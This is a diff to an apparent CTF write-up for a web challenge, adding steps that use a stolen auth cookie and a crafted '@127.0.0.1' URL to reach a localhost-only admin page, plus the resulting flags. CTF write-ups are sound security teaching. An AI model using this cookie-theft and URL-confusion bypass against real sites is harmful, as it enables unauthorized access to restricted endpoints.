@@ -24,6 +24,15 @@ This task is pretty easy to solve. We have a typical XSS attack here.
 > atob("ZmxhZz1DVEZ7M21icjRjM190aGVfYzAwazFlX3cwcjFkX29yZDNyfTsgYXV0aD1UVXRiOVBQQTljWWtmY1ZRV1l6eHk0WGJ0eUwzVk5Leg==")
 "flag=CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}; auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz"
 ```
+In `/admin/controls` we can find the second flag by using the auth cookie.
+```
+Requests only accepted from 127.0.0.1
+```
+After some trials, we can use `/watch?livestream=...` for Local File Inclusion attack (LFI) by generating the following URL:
+```
+https://cwo-xss.web.ctfcompetition.com/watch?livestream=https://cwo-xss.web.ctfcompetition.com@127.0.0.1/admin/controls
+```
 
 **FLAG: CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}**
 
+**FLAG: CTF{WhatIsThisCookieFriendSpaceBookPlusAllAccessRedPremiumThingLooksYummy}**
